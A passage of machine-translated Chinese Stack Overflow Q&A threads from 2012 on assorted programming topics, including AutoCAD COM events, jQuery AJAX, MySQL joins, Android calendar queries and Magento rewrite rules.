    }

    public String speak() {
        setChanged(); // We have been changed
        notifyObservers(); // Notify everyone that we have changed
        return getName() +  "Maaaauuu";
    }

} 
```

现在我们创建一个类，希望在发生变化时进行观察：

```
public class Watcher implements java.util.Observer
{
    public void update(Observable o, Object arg) {
        System.out.println("Something has changed");
    }
} 
```

最后，我们用 a 注册我们的观察者，`mammal`以便在它发生变化时通知他们。

```
public class Main
{
    public static void main(String args[]) {
        mammal cow = new mammal();
        Watcher farmer = new Watcher();
        cow.addObserver(farmer);
        cow.speak();
    }
} 
```

这种方法有很多缺点：

1.  观察者可以注册到任何 Observable 对象。您可能希望您的观察者只能观察`mammal`s。另一方面，您可能希望只有某些类型的观察者能够观察`mammal`.
2.  真的没有办法让你知道没有 `Observer`的到底发生了什么变化`mammal`
    *   [使用notifyObservers(Object arg)](https://docs.oracle.com/javase/7/docs/api/java/util/Observable.html#notifyObservers(java.lang.Object))方法将`mammal`某种消息传递给观察者
    *   或观察者检查设置在`mammal`

如果这些缺点中的任何一个对您来说是个问题，那么您可能希望避免`Observer`并`Observable`考虑修改现有的类（`mammal`以及无论您`Observers`是什么）以实现它们自己的、特定于应用程序的方法。

# .net - .NET System._ComObject AutoCAD 事件接口

> ID：10069300
> 
> 赞同：1
> 
> 时间：2012-04-09T05:29:32.243
> 
> 标签：.net, events, com, interface, autocad

我已经使用 .NET Reflector 从 AutoCAD 互操作 .dll 重新创建了 _DAcadApplicationEvents 接口，并且我的代码适用于 AutoCAD 2010。问题是我需要它与 AutoCAD 2006 一直兼容到 2012 年及以后. 我正在运行 .NET 4.0，因此我将 Embed Interop Type 设置为 true 以确保我的 Application 对象正确解析到运行时而不需要反射调用方法，但我似乎无法找到一种方法来让事件接口在没有的情况下工作GUID 中的硬编码（特定于程序集）。

* * *

这是我从原始 AutoDesk.AutoCAD.Interop.dll 创建的自定义界面：

```
 <ComImport(), Guid("1F893620-C96D-4361-BBAF-A61D4144B7F8"), TypeLibType(CShort(&H1010))>
    Public Interface _DAcadApplicationEventsClone
        <MethodImpl(MethodImplOptions.InternalCall, MethodCodeType:=MethodCodeType.Runtime), DispId(1)>
        Sub SysVarChanged(<[In](), MarshalAs(UnmanagedType.BStr)> ByVal SysvarName As String, <[In](),
                          MarshalAs(UnmanagedType.Struct)> ByVal newVal As Object)

        <MethodImpl(MethodImplOptions.InternalCall, MethodCodeType:=MethodCodeType.Runtime), DispId(8)>
        Sub BeginQuit(<[In](), Out()> ByRef Cancel As Boolean)
    End Interface 
```

Application 对象以这种方式创建：

```
Public Application As Object 
```

* * *

```
Application = Marshal.GetActiveObject("AutoCAD.Application") 
```

接下来我使用 IConnectionPoint 连接到克隆的接口：

```
Dim acGUID As New Guid(GetInterfaceGUID())

Dim acConnectionPoint As ComTypes.IConnectionPoint = Nothing
TryCast(Application, ComTypes.IConnectionPointContainer).FindConnectionPoint(acGUID, acConnectionPoint)

Dim acSinkCookie As Integer
acConnectionPoint.Advise(Me, acSinkCookie) 
```

* * *

如您所见，我正在运行一个名为“GetInterfaceGUID”的函数，以根据系统上安装的 AutoCAD 版本动态搜索正确的 GUID。但是，如果返回的 GUID 与接口上的硬编码 GUID 不匹配，则无论如何它都不会工作。我已经尝试过不同的反射方法来处理 System._ComObject，这是我已经接近的唯一方法。我觉得我非常接近成功，并且在这一点上将不胜感激。提前致谢。

-洛克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-10T08:13:23.383

如您所见，AutoCAD COM 互操作取决于版本甚至位数（32 位/64 位）。为什么不使用 AutoCAD .NET 应用程序事件来摆脱这些麻烦，如下所示？

```
using System;
using System.Text;
using System.Linq;
using System.Xml;
using System.Reflection;
using System.ComponentModel;
using System.Collections;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Media.Imaging;
using System.Windows.Forms;

using System.IO;
using Autodesk.AutoCAD.ApplicationServices;
using Autodesk.AutoCAD.DatabaseServices;
using Autodesk.AutoCAD.Runtime;
using Autodesk.AutoCAD.EditorInput;

using Autodesk.AutoCAD.Geometry;
using Autodesk.AutoCAD.Windows;

using AcadApplication = Autodesk.AutoCAD.ApplicationServices.Application;
using AcadDocument = Autodesk.AutoCAD.ApplicationServices.Document;
using AcadWindows = Autodesk.AutoCAD.Windows;

namespace AcadNetAddinByVS2010
{
    public class AppEvents1
    {
        bool mSuppressMsgOutput = false;

        void OptionalMessageOutput(EventArgs obj, string eventName)
        {
            if (!mSuppressMsgOutput)
            {
                string msg = string.Format("Info about the {0} event:{1}", eventName, Environment.NewLine);

                PropertyInfo[] piArr = obj.GetType().GetProperties();
                foreach (PropertyInfo pi in piArr)
                {
                    string attValue = pi.GetValue(obj, null).ToString();
                    msg += string.Format("\t{0}: {1}{2}", pi.Name, attValue, Environment.NewLine);
                }

                MessageBox.Show(msg, "Event: " + eventName, MessageBoxButtons.OK, MessageBoxIcon.Information);
                System.Diagnostics.Debug.Write(msg);
            }
        }

        public void Register()
        {
            AcadApplication.SystemVariableChanging += AppEvent_SystemVariableChanging_Handler;
            AcadApplication.SystemVariableChanged += AppEvent_SystemVariableChanged_Handler;
            AcadApplication.QuitWillStart += AppEvent_QuitWillStart_Handler;
            AcadApplication.QuitAborted += AppEvent_QuitAborted_Handler;
            AcadApplication.PreTranslateMessage += AppEvent_PreTranslateMessage_Handler;
            AcadApplication.LeaveModal += AppEvent_LeaveModal_Handler;
            AcadApplication.Idle += AppEvent_Idle_Handler;
            AcadApplication.EnterModal += AppEvent_EnterModal_Handler;
            AcadApplication.DisplayingOptionDialog += AppEvent_DisplayingOptionDialog_Handler;
            AcadApplication.DisplayingDraftingSettingsDialog += AppEvent_DisplayingDraftingSettingsDialog_Handler;
            AcadApplication.DisplayingCustomizeDialog += AppEvent_DisplayingCustomizeDialog_Handler;
            AcadApplication.BeginQuit += AppEvent_BeginQuit_Handler;

        }

        public void UnRegister()
        {
            AcadApplication.SystemVariableChanging -= AppEvent_SystemVariableChanging_Handler;
            AcadApplication.SystemVariableChanged -= AppEvent_SystemVariableChanged_Handler;
            AcadApplication.QuitWillStart -= AppEvent_QuitWillStart_Handler;
            AcadApplication.QuitAborted -= AppEvent_QuitAborted_Handler;
            AcadApplication.PreTranslateMessage -= AppEvent_PreTranslateMessage_Handler;
            AcadApplication.LeaveModal -= AppEvent_LeaveModal_Handler;
            AcadApplication.Idle -= AppEvent_Idle_Handler;
            AcadApplication.EnterModal -= AppEvent_EnterModal_Handler;
            AcadApplication.DisplayingOptionDialog -= AppEvent_DisplayingOptionDialog_Handler;
            AcadApplication.DisplayingDraftingSettingsDialog -= AppEvent_DisplayingDraftingSettingsDialog_Handler;
            AcadApplication.DisplayingCustomizeDialog -= AppEvent_DisplayingCustomizeDialog_Handler;
            AcadApplication.BeginQuit -= AppEvent_BeginQuit_Handler;

        }

        public void AppEvent_BeginQuit_Handler(object sender, EventArgs e)
        {
            OptionalMessageOutput(e, "BeginQuit");

        }

        public void AppEvent_DisplayingCustomizeDialog_Handler(object sender, TabbedDialogEventArgs e)
        {
            OptionalMessageOutput(e, "DisplayingCustomizeDialog");

        }

        public void AppEvent_DisplayingDraftingSettingsDialog_Handler(object sender, TabbedDialogEventArgs e)
        {
            OptionalMessageOutput(e, "DisplayingDraftingSettingsDialog");

        }

        public void AppEvent_DisplayingOptionDialog_Handler(object sender, TabbedDialogEventArgs e)
        {
            OptionalMessageOutput(e, "DisplayingOptionDialog");

        }

        public void AppEvent_EnterModal_Handler(object sender, EventArgs e)
        {
            OptionalMessageOutput(e, "EnterModal");

        }

        public void AppEvent_Idle_Handler(object sender, EventArgs e)
        {
            OptionalMessageOutput(e, "Idle");

        }

        public void AppEvent_LeaveModal_Handler(object sender, EventArgs e)
        {
            OptionalMessageOutput(e, "LeaveModal");

        }

        public void AppEvent_PreTranslateMessage_Handler(object sender, PreTranslateMessageEventArgs e)
        {
            OptionalMessageOutput(e, "PreTranslateMessage");

        }

        public void AppEvent_QuitAborted_Handler(object sender, EventArgs e)
        {
            OptionalMessageOutput(e, "QuitAborted");

        }

        public void AppEvent_QuitWillStart_Handler(object sender, EventArgs e)
        {
            OptionalMessageOutput(e, "QuitWillStart");

        }

        public void AppEvent_SystemVariableChanged_Handler(object sender, Autodesk.AutoCAD.ApplicationServices.SystemVariableChangedEventArgs e)
        {
            OptionalMessageOutput(e, "SystemVariableChanged");

        }

        public void AppEvent_SystemVariableChanging_Handler(object sender, Autodesk.AutoCAD.ApplicationServices.SystemVariableChangingEventArgs e)
        {
            OptionalMessageOutput(e, "SystemVariableChanging");

        }

    }
} 
```

顺便说一下，选择的 IExtensionApplication 实现中的事件注册代码如下：

```
#region Namespaces

using System;
using System.Text;
using System.Linq;
using System.Xml;
using System.Reflection;
using System.ComponentModel;
using System.Collections;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Media.Imaging;
using System.Windows.Forms;
using System.Drawing;
using System.IO;

using Autodesk.AutoCAD.ApplicationServices;
using Autodesk.AutoCAD.DatabaseServices;
using Autodesk.AutoCAD.Runtime;
using Autodesk.AutoCAD.EditorInput;
using Autodesk.AutoCAD.Geometry;
using Autodesk.AutoCAD.Windows;

using AcadApplication = Autodesk.AutoCAD.ApplicationServices.Application;
using AcadDocument = Autodesk.AutoCAD.ApplicationServices.Document;
using AcadWindows = Autodesk.AutoCAD.Windows;

#endregion

namespace AcadNetAddinByVS2010
{
    public class ExtApp : IExtensionApplication
    {
        #region IExtensionApplication Members

        public void Initialize()
        {
            //TODO: add code to run when the ExtApp initializes. Here are a few examples:
            //          Checking some host information like build #, a patch or a particular Arx/Dbx/Dll;
            //          Creating/Opening some files to use in the whole life of the assembly, e.g. logs;
            //          Adding some ribbon tabs, panels, and/or buttons, when necessary;
            //          Loading some dependents explicitly which are not taken care of automatically;
            //          Subscribing to some events which are important for the whole session;
            //          Etc.

            mAppEvents1.Register();
        }

        public void Terminate()
        {
            //TODO: add code to clean up things when the ExtApp terminates. For example:
            //          Closing the log files;
            //          Deleting the custom ribbon tabs/panels/buttons;
            //          Unloading those dependents;
            //          Un-subscribing to those events;
            //          Etc.

            mAppEvents1.UnRegister();
        }

        #endregion

        AppEvents1 mAppEvents1 = new AppEvents1();
    }
} 
```

# facebook - 将用户添加到应用程序

> ID：10069301
> 
> 赞同：1
> 
> 时间：2012-04-09T05:29:32.527
> 
> 标签：facebook, facebook-graph-api, curl

您如何使用 curl 通过他们的 facebook id 将开发人员（或测试人员）添加到您的应用程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T23:02:43.397

是的，您可以使用 CURL 将测试用户添加到您的应用程序中。请参阅：[https ://developers.facebook.com/docs/test_users/](https://developers.facebook.com/docs/test_users/)

`https://graph.facebook.com/APP_ID/accounts/test-users? installed=true &name=FULL_NAME &locale=en_US &permissions=read_stream &method=post &access_token=APP_ACCESS_TOKEN`

# javascript - jquery - 排队事件直到ajax调用完成

> ID：10069306
> 
> 赞同：1
> 
> 时间：2012-04-09T05:30:00.297
> 
> 标签：javascript, jquery

我在这里使用rails和jquery。

当电子邮件字段失去焦点（模糊）时，我调用服务器以验证它是否有效（电子邮件格式和唯一性）。如果它有效，我将隐藏的输入值更新为 true，如果它无效则更新为 false。

然后用户单击（聚焦）另一个电子邮件字段，如果第一封电子邮件无效（隐藏输入错误）我禁用此字段并发送一些警报消息。

我的问题是，用户在第一个电子邮件字段上键入了一封电子邮件，它是一个有效的电子邮件，所以模糊我更新隐藏字段但是如果用户在输入第一封电子邮件后点击第二个电子邮件字段，则焦点事件在第二个在更新隐藏输入之前触发字段，并且错误地禁用了第二个电子邮件字段。

基本上我需要将焦点事件排队，直到 ajax 调用完成

抱歉，解释起来有点混乱，如果有人理解我所说的话，有解决方法吗？

# jquery - 使用 jQuery ASP.NET 的异步 AJAX 调用不起作用

> ID：10069307
> 
> 赞同：0
> 
> 时间：2012-04-09T05:30:08.147
> 
> 标签：jquery, ajax, web-services, asynchronous

我创建了一个 web 服务，调用来自 jquery ajax 函数。但即使**async**设置为 true，它也不能异步工作..

我的 ASP.NET 网络服务代码

```
<System.Web.Services.WebMethod()> _
Public Shared Function sampleService(ByVal ttid As String) As String
Threading.Thread.Sleep(5 * 1000)
Return "Hello World"
End Function 
```

JQuery 调用脚本

```
<script language="javascript">
$(function() {
    var tempParam = {
        ttid: 100
    };

    var param = $.toJSON(tempParam);
    $.ajax({
        type: "POST",
        url: "testservice.aspx/sampleService",
        data: param,
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        async: true,
        error: function() {
            alert("Error");
        },
        success: function(msg) {
            alert("Success")
            alert(msg.d)
        }
    });
});​    </script> 
```

在这里，我将其设置为 async = true。即使这样，我也会在 5 秒后收到成功消息。这意味着不是异步的。我相信如果 async = true 它不会等待来自网络服务的消息。这实际上是我的要求。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:45:24.797

成功函数是一个回调；它被设计为在收到响应后调用。如果在服务器线程执行完成之前调用它，您如何确定成功或错误？对 Sleep 的调用会暂停当前的服务器线程，因此您的响应当然需要 5 秒钟才能恢复。

异步部分将适用于直接跟随您的 ajax 帖子的 Javascript 代码。例如：

```
<script language="javascript">
$(function() {
    var tempParam = {
        ttid: 100
    };

    var param = $.toJSON(tempParam);
    $.ajax({
        type: "POST",
        url: "testservice.aspx/sampleService",
        data: param,
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        async: true,
        error: function() {
            alert("Error");
        },
        success: function(msg) {
            alert("Success")
            alert(msg.d)
        }
    });
    alert('This alert is asynchronous!  We do not know yet if the ajax call will be successful because the server thread is still sleeping.');
});​    </script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:35:55.633

> 在这里，我将其设置为 async = true。即使这样，我也会在 5 秒后收到成功消息。这意味着不是异步的。我相信如果 async = true 它不会等待来自网络服务的消息。

不，`async`意味着工作线程被锁定并且不会执行任何其他代码（并且可能会冻结窗口......），直到它从服务器获得对其请求的响应。
这并不意味着你会在瞬间得到答案！

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-09T05:35:17.143

您是否检查过 web 服务设置为在脚本中执行。

```
// To allow this Web Service to be called from script, using ASP.NET AJAX, uncomment the following line. 

[System.Web.Script.Services.ScriptService] 
```

请检查此项并发送更新是否有效。

# php - MySQL joins - 结合类别表和数据表

> ID：10069309
> 
> 赞同：1
> 
> 时间：2012-04-09T05:30:27.770
> 
> 标签：php, mysql, inner-join

我有一个`category`将类别编号与类别名称联系起来的表格。例如，1-水果、2-蔬菜、3-昆虫、4-城市等...

我有另一个表`item`，其中包含完全属于一个类别的项目。每个项目都有一个唯一的 ID、名称和类别。例如，314-南瓜-（类别）1

简而言之：

```
category
-------
c_id   (int)
c_name (varchar)

item
-------
i_id   (int)
i_name (varchar)
i_cat  (int) 
```

问题是并非所有类别都有项目。我使用以下内容按类别订购商品：

```
$STH = $DBH->prepare("SELECT * FROM item ORDER BY i_cat"); 
```

这是内置在表格中的，在 cat(egory) 更改时提取标题。当然，没有项目的类别不会被选中。

我想要的是一个包含所有类别的表格（即使是那些没有实际项目的），并在每个类别下列出正确的项目。

我可以设计一些繁琐的方法来做我想做的事，但必须有一个巧妙的解决方案。如何在一次调用中加入两个表中的数据，以便每个类别和每个项目都存在？我认为它涉及使用`inner join`，但我看不出如何有效地做到这一点。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:41:07.867

尝试以下查询，它将从表中获取所有类别以及从`category`表中获取相应项目`item`：

```
SELECT * 
FROM category c
LEFT JOIN item i
ON c.c_id = i.i_cat
ORDER BY i_cat 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:44:18.163

实际上，这不是`inner join`您要找的东西。An`inner join`将获取所有匹配的值并删除不匹配的值。A`left join`将从左侧表格中获取值，并尝试将它们与右侧表格中的值连接起来。如果左表中的一行在右表中没有匹配项，则这些值将填充为`NULL`.

试试这个查询：

```
select * from category
left join item on c_id = i_id
order by i_cat 
```

# linux - 准备计算机学习系统调用和 Linux 内核模块

> ID：10069310
> 
> 赞同：1
> 
> 时间：2012-04-09T05:30:55.413
> 
> 标签：linux, linux-kernel, system-calls, kernel-module

我想通过制作模块和系统调用来开始我的 Linux 内核编程。但我不想玩我现有的系统。我已经下载了一个 2.6 内核用于实验目的，但我不知道如何将它用于我的实验。请帮忙。

1）我应该在哪里进行系统调用（我的意思是哪个内核）？以及如何设置？

2）对于像我这样的初学者来说学习系统调用的好地方吗？

（更新） - 我可以使用早期版本的 Linux 内核吗（在启动时它显示我以前的版本）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:33:22.570

安装 VirtualBox，在 VM 中安装 Linux 发行版，进行设置，将其关闭（未挂起），将其复制到某处，以便在丢弃它/使其无法启动时恢复。在 VM 中进行实验。

使用什么内核并不重要。但是，使用与可用用户空间（尤其是`glibc`）匹配的用户空间会做得更好，这就是为什么选择发行版比选择内核版本更好的原因。

# html - 在鼠标悬停时在 html 页面上显示工具栏。（悬停在推文上时类似于推特）

> ID：10069312
> 
> 赞同：-1
> 
> 时间：2012-04-09T05:31:23.357
> 
> 标签：html, css

在我的网站中，当用户将鼠标悬停在任何回复上时，我想显示带有选项的工具栏。该功能类似于我们将鼠标悬停在 twitter 中的推文上时。我怎样才能做到这一点。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:33:26.960

这是我尝试过的一个简单的 HTML/CSS 模型...

HTML：

```
<div class="container">
    Testing text!
    <div class="tooltip">Here's a tooltip</div>
</div>
<div class="container">
    Testing text!
    <div class="tooltip">Here's a tooltip</div>
</div>
<div class="container">
    Testing text!
    <div class="tooltip">Here's a tooltip</div>
</div> 
```

CSS：

```
.tooltip { display: none; }
.container { width: 300px; height: 50px; margin: 10px 0px; border: 1px solid #000; }

.container:hover > div.tooltip { display: block; } 
```

[jsFiddle](http://jsfiddle.net/pYxqx/)

这个想法是您将工具提示 div 包含在另一个包含您的内容的 div 中。此工具提示的默认`display`设置为`none`。然后你有 CSS`.container:hover > div.tooltip { display: block; }`声明“当容器类悬停时，带有工具提示类的 div 的子级将更改为`display: block`”。这也很容易用 Javascript 完成，但我认为这应该足以满足您的需求。希望这有帮助！

# c# - 如何引用另一个文件夹中的表单（解决方案资源管理器）

> ID：10069316
> 
> 赞同：1
> 
> 时间：2012-04-09T05:31:34.650
> 
> 标签：c#, winforms

我是 C# 的新手。我有 2 个表格要打开。

我的解决方案资源管理器是这样的：

*   NewFolder <-- 这里是 form3.cs
*   Form2.cs
*   Form1.cs

这是我的代码

```
public partial class Form1 : Form
{ 
    public Form1()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        Form2 frm2 = new Form2();
        frm2.Show();
    }

    private void button2_Click(object sender, EventArgs e)
    {
    }
} 
```

**单击button2时如何在文件夹中打开表格3？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:42:33.933

您可以尝试以下两种方法之一。一，输入以下代码：

```
form3 frm3 = new form3(); 
```

在 Visual Studio 中右键单击“form3”，找到“resolve”。单击以解决引用。（请注意，您必须准确输入名称才能显示“resolve”，并且区分大小写）。

或者，您可以尝试找出命名空间。默认情况下，我希望它是“NewFolder.form3”（这就是 Visual Studio 设置命名空间的方式）。您还可以尝试将“form3”代码包装在“MyApp.Forms”之类的命名空间中，然后在代码中调用“MyApp.Forms.form3”。像这样包裹：

```
namespace MyApp.Forms
{
    public partial class form3 : Form
    {
        ...
    }
} 
```

# cakephp - cakephp generateTreeList 限制深度

> ID：10069318
> 
> 赞同：3
> 
> 时间：2012-04-09T05:31:47.473
> 
> 标签：cakephp, tree

如何限制 cakephp 中 generatetreelist 返回的树的深度？

[文档](http://book.cakephp.org/2.0/en/core-libraries/behaviors/tree.html) 显示我无法通过深度。解决这个问题的优雅方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-08-18T21:39:33.720

CakePHP 2.7 中添加了[节点级别（深度）](http://book.cakephp.org/2.0/en/core-libraries/behaviors/tree.html#node-level-depth)

`condition`我想如果您按照书中的说明缓存级别，您可以在调用中指定所需的级别`generateTreeList`...

# android - 如何在 android 设备中获取设备日历事件列表？

> ID：10069319
> 
> 赞同：9
> 
> 时间：2012-04-09T05:32:06.100
> 
> 标签：android, events, calendar

我想在 android 设备上获取过去 7 天的日历活动吗？我是初学者，所以告诉我一步一步的解决方案..！只获取和阅读日历而不是更新和删除。有人帮我吗？我在下面使用了代码！

```
public class Example {

    public static void readCalendar(Context context) {

        ContentResolver contentResolver = context.getContentResolver();

        // Fetch a list of all calendars synced with the device, their display names and whether the
        // user has them selected for display.

        final Cursor cursor = contentResolver.query(Uri.parse("content://calendar/calendars"),
                (new String[] { "_id", "displayName", "selected" }), null, null, null);
        // For a full list of available columns see http://tinyurl.com/yfbg76w

        HashSet<String> calendarIds = new HashSet<String>();

        while (cursor.moveToNext()) {

            final String _id = cursor.getString(0);
            final String displayName = cursor.getString(1);
            final Boolean selected = !cursor.getString(2).equals("0");

            Log.v("anim","Id: " + _id + " Display Name: " + displayName + " Selected: " + selected);
            calendarIds.add(_id);
        }

        // For each calendar, display all the events from the previous week to the end of next week.        
        for (String id : calendarIds) {
            Uri.Builder builder = Uri.parse("content://calendar/instances/when").buildUpon();
            long now = new Date().getTime();
            ContentUris.appendId(builder, now - DateUtils.WEEK_IN_MILLIS);
            ContentUris.appendId(builder, now + DateUtils.WEEK_IN_MILLIS);

            Cursor eventCursor = contentResolver.query(builder.build(),
                    new String[] { "title", "begin", "end", "allDay"}, "Calendars._id=" + id,
                    null, "startDay ASC, startMinute ASC"); 
            // For a full list of available columns see http://tinyurl.com/yfbg76w

            while (eventCursor.moveToNext()) {
                final String title = eventCursor.getString(0);
                final Date begin = new Date(eventCursor.getLong(1));
                final Date end = new Date(eventCursor.getLong(2));
                final Boolean allDay = !eventCursor.getString(3).equals("0");

                Log.v("anim","Title: " + title + " Begin: " + begin + " End: " + end +
                        " All Day: " + allDay);
            }
        }
    }

} 
```

我得到了空指针异常。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-04-18T13:01:35.803

我的问题解决了，我在下面使用`code`-

```
public class Utility {
    public static ArrayList<String> nameOfEvent = new ArrayList<String>();
    public static ArrayList<String> startDates = new ArrayList<String>();
    public static ArrayList<String> endDates = new ArrayList<String>();
    public static ArrayList<String> descriptions = new ArrayList<String>();

    public static ArrayList<String> readCalendarEvent(Context context) {
        Cursor cursor = context.getContentResolver()
                .query(
                        Uri.parse("content://com.android.calendar/events"),
                        new String[] { "calendar_id", "title", "description",
                                "dtstart", "dtend", "eventLocation" }, null,
                        null, null);
        cursor.moveToFirst();
        // fetching calendars name
        String CNames[] = new String[cursor.getCount()];

        // fetching calendars id
        nameOfEvent.clear();
        startDates.clear();
        endDates.clear();
        descriptions.clear();
        for (int i = 0; i < CNames.length; i++) {

            nameOfEvent.add(cursor.getString(1));
            startDates.add(getDate(Long.parseLong(cursor.getString(3))));
            endDates.add(getDate(Long.parseLong(cursor.getString(4))));
            descriptions.add(cursor.getString(2));
            CNames[i] = cursor.getString(1);
            cursor.moveToNext();

        }
        return nameOfEvent;
    }

    public static String getDate(long milliSeconds) {
        SimpleDateFormat formatter = new SimpleDateFormat(
                "dd/MM/yyyy hh:mm:ss a");
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(milliSeconds);
        return formatter.format(calendar.getTime());
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-21T19:49:03.390

十分感谢！但是，您只从一个日历中获取了所有事件，例如您的主要 Google 帐户，您如何从所有可用日历中获取事件？

请注意，在您的内置日历小部件上，您可以看到来自 Gmail、Exchange、Facebook 等的事件。如何也获得这些事件？

至于日期或星期的特定事件，我通过在查询语句中使用选择子句和选择参数来做到这一点，如下所示：

这些是选择和参数定义：

```
Uri content = Uri.parse("content://com.android.calendar/events");
String[] vec = new String[] { "calendar_id", "title", "description", "dtstart", "dtend", "allDay", "eventLocation" };
String selectionClause = "(dtstart >= ? AND dtend <= ?) OR (dtstart >= ? AND allDay = ?)";
String[] selectionsArgs = new String[]{"" + dtstart, "" + dtend, "" + dtstart, "1"}; 
```

这就是查询的样子：

```
 ContentResolver contentResolver = context.getContentResolver();
   Cursor cursor = contentResolver.query(content, vec, selectionClause, selectionsArgs, null); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-11-19T17:30:56.567

这是获取所有日历事件列表的方法。

```
public static void readCalendarEvent(Context context) {

       ContentResolver contentResolver = context.getContentResolver();
       cursor = contentResolver.query(Uri.parse("content://com.android.calendar/events"), (new String[] { "_id", "title", "organizer", "dtstart", "dtend"}), null, null, null);

       List<GoogleCalendar> gCalendar = new ArrayList<GoogleCalendar>();
        try {

            if (cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    GoogleCalendar googleCalendar = new GoogleCalendar();
                    // event_ID: ID of tabel Event 
                    int event_ID = cursor.getInt(0);
                    googleCalendar.setEvent_id(event_ID);
                    // title of Event
                    String title = cursor.getString(1);
                    googleCalendar.setTitle(title);
                    String mOrganizer = cursor.getString(2);
                    googleCalendar.setOrganizer(mOrganizer);
                    // Date start of Event
                    String dtStart = cursor.getString(3);
                    googleCalendar.setDtstart(dtStart);
                    // Date end of Event
                    String dtEnd = cursor.getString(4);
                    googleCalendar.setDtend(dtEnd);
                    gCalendar.add(googleCalendar);
                    Log.d("CaledarM",googleCalendar.getTitle()+" name = "+googleCalendar.getOrganizer()+" dateStart = "+googleCalendar.getDtstart()+" Size = " + gCalendar.size());
                }
            }
        } catch (AssertionError ex) {
            ex.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

// class GoogleCalendar()

public class GoogleCalendar {

    private int event_id;
    private String title,
            organizer,
            dtstart,
            dtend;

    public GoogleCalendar()
    {
    }

    public int getEvent_id() {
        return event_id;
    }

    public void setEvent_id(int calendar_id) {
        event_id = calendar_id;
    }

    public String getTitle() {
        return title;
    }

    public void setTitle(String title) {
        this.title = title;
    }

    public String getOrganizer() {
        return organizer;
    }

    public void setOrganizer(String description) {
        this.organizer = description;
    }

    public String getDtstart() {
        return dtstart;
    }

    public void setDtstart(String dtstart1) {
        this.dtstart = dtstart1;
    }

    public String getDtend() {
        return dtend;
    }

    public void setDtend(String dtend1) {
        this.dtend = dtend1;
    }
} 
```

# apache - Magento Apache Mod 重写 URL

> ID：10069333
> 
> 赞同：0
> 
> 时间：2012-04-09T05:33:35.413
> 
> 标签：apache, mod-rewrite

我有一个推荐朋友模块，它为人们提供了一个长推荐网址

我想缩短它以使人们更容易输入，但可以弄清楚如何在 .htaccess 中完成它

下面是我的 .htaccess 的重写部分

我想重定向

/ap/ *** to /awardpoints/index/goReferral/referrer/** **(* ** 是客户 ID)*

 *我试过了：

```
RewriteRule ^ap/([0-9]+)$ /awardpoints/index/goReferral/referrer/$1 [R] 
```

但它不起作用

```
<IfModule mod_rewrite.c>

############################################
## enable rewrites

Options +FollowSymLinks
RewriteEngine on

############################################
## you can put here your magento root folder
## path relative to web root

#RewriteBase /magento/

############################################
## workaround for HTTP authorization
## in CGI environment

RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]

############################################
## TRACE and TRACK HTTP methods disabled to prevent XSS attacks

RewriteCond %{REQUEST_METHOD} ^TRAC[EK]
RewriteRule .* - [L,R=405]

############################################
## always send 404 on missing files in these folders

RewriteCond %{REQUEST_URI} !^/(media|skin|js)/

############################################
## never rewrite for existing files, directories and links

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-l

############################################
## rewrite everything else to index.php

RewriteRule .* index.php [L]

</IfModule> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T10:03:31.903

你可以使用magento内部url重写管理来实现这个，或者你可以试试这个

```
RewriteRule ^ap/([^/\.]+)/?$ /awardpoints/index/goReferral/referrer/$1 [L]
RewriteRule .* index.php [L] 
```

以下是（修改为您的网址）从[http://www.workingwith.me.uk/articles/scripting/mod_rewrite复制和粘贴](http://www.workingwith.me.uk/articles/scripting/mod_rewrite)

> ^ap/ 查看请求的页面是否以 page/ 开头。如果没有，此规则将被忽略。
> 
> ([^/.]+) 这里，括号表示任何匹配的内容都将被 RewriteRule 记住。在括号内，它说“我想要一个或多个不是正斜杠或句点的字符，请”。在这里发现的任何东西都会被捕获和记住。
> 
> /?$ 确保在刚刚匹配的内容之后找到的唯一内容是可能的正斜杠，而不是其他内容。如果发现任何其他内容，则此 RewriteRule 将被忽略。
> 
> /awardpoints/index/goReferral/referrer/ Apache 将加载的实际页面。$1 神奇地替换为之前捕获的文本。
> 
> [L] 如果 RewriteRules 成功，则告诉 Apache 不再处理任何 RewriteRules。*

# sockets - 用另一种编程语言实现node js的步骤

> ID：10069334
> 
> 赞同：0
> 
> 时间：2012-04-09T05:34:12.883
> 
> 标签：sockets, node.js, network-programming, udp

我希望 Node JS 服务器与 UDP 或 TCP 客户端通信。

我的问题：

1.  当我想用另一种语言创建套接字客户端但服务器使用的是 nodejs 时，有哪些步骤或建议？
2.  我已经用 java 创建了 UDP 客户端，但是当我想连接到 Node JS 服务器时，我无法连接。我认为在节点 js 中有什么规则可以连接到服务器，你的意见如何？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T22:24:14.220

> 如果我的问题不好，我很抱歉，我的意思是我想用 UDP 和 TCP 之类的 nodejs 实现套接字，我想使用另一个编程来创建套接字客户端。

